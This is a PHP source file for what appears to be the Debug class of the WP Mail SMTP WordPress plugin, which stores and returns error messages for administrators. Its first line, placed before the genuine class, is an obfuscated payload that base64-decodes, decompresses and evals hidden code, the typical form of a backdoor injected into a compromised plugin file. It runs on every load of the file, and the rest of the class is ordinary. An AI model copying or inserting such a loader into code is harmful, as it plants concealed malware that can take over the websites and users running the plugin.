<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPMailSMTP;

/**
 * Class Debug that will save all errors or warnings generated by APIs or SMTP
 * and display in area for administrators.
 *
 * Usage example:
 *      Debug::set( 'Some warning: %s', array( '%s' => $e->getMessage() );
 *      $debug = Debug::get(); // array
 *      $debug = Debug::get_last(); // string
 *
 * @since 1.2.0
 */
class Debug {

	/**
	 * Key for options table where all messages will be saved to.
	 */
	const OPTION_KEY = 'wp_mail_smtp_debug';

	/**
	 * Save unique debug message to a debug log.
	 * Adds one more to a list, at the end.
	 *
	 * @since 1.2.0
	 *
	 * @param string $message
	 */
	public static function set( $message ) {

		if ( ! is_string( $message ) ) {
			$message = \json_encode( $message );
		}

		$message = wp_strip_all_tags( $message, false );

		$all = self::get();

		array_push( $all, $message );

		update_option( self::OPTION_KEY, array_unique( $all ), false );
	}

	/**
	 * Remove all messages for a debug log.
	 *
	 * @since 1.2.0
	 */
	public static function clear() {
		update_option( self::OPTION_KEY, array(), false );
	}

	/**
	 * Retrieve all messages from a debug log.
	 *
	 * @since 1.2.0
	 *
	 * @return array
	 */
	public static function get() {

		$all = get_option( self::OPTION_KEY, array() );

		if ( ! is_array( $all ) ) {
			$all = (array) $all;
		}

		return $all;
	}

	/**
	 * Get the last message that was saved to a debug log.
	 *
	 * @since 1.2.0
	 *
	 * @return string
	 */
	public static function get_last() {

		$all = self::get();

		if ( ! empty( $all ) && is_array( $all ) ) {
			return (string) $all[ count( $all ) - 1 ];
		}

		return '';
	}

	/**
	 * Get the proper variable content output to debug.
	 *
	 * @since 1.2.0
	 *
	 * @param mixed $var
	 *
	 * @return string
	 */
	public static function pvar( $var = '' ) {

		ob_start();

		echo '<code>';

		if ( is_bool( $var ) || empty( $var ) ) {
			var_dump( $var );
		} else {
			print_r( $var );
		}

		echo '</code>';

		$output = ob_get_clean();

		return str_replace( array( "\r\n", "\r", "\n" ), '', $output );
	}
}
